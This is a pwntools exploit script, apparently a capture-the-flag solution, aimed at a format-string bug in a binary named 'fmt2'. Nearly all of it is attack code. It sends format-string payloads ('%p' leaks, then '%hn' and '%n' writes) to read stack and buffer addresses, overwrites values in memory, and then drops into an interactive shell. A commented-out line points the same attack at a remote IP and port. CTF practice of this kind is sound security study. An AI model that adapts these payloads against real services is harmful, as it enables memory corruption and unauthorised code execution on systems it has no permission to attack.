from pwn import *

elf = ELF("./fmt2")
libc = ELF('/mnt/hgfs/Pwn/libs/ubuntu11.2/lib/x86_64-linux-gnu/libc-2.23.so')
ld = ELF('/mnt/hgfs/Pwn/libs/ubuntu11.2/lib/x86_64-linux-gnu/ld-2.23.so')

context(arch = 'amd64', os = 'linux', log_level = 'debug')
sh = process(elf.path)
#sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : libc.path})
#sh = remote("121.4.15.155", 10011)
#gdb.attach(sh)

sh.recvuntil('N1k0la?\n')
payload = b"%paaaa%10$p"
sh.sendline(payload)
content = sh.recv(numb = 32)
buf = int(content[:14], 16)
stack = int(content[-14:], 16)
success("buf " + hex(buf))
success("stack " + hex(stack))
offset_0 = (buf & 0xffff) - 80
offset_1 = (stack & 0xffff) - 248

sh.recvuntil('N1k0la?\n')
log.info("buf " + hex(buf))
log.info("stack " + hex(stack))
payload = "%" + str(offset_1) + "c%10$hn"
sh.sendline(payload)


sh.recvuntil('N1k0la?\n')
payload = "%" + str(offset_0) + "c%39$hn"
sh.sendline(payload)

sh.recvuntil('N1k0la?\n')
payload = "%1314c%8$n"
sh.sendline(payload)

sh.sendline("aaaa\x00")
sh.sendline("ssss\x00")

sh.interactive()
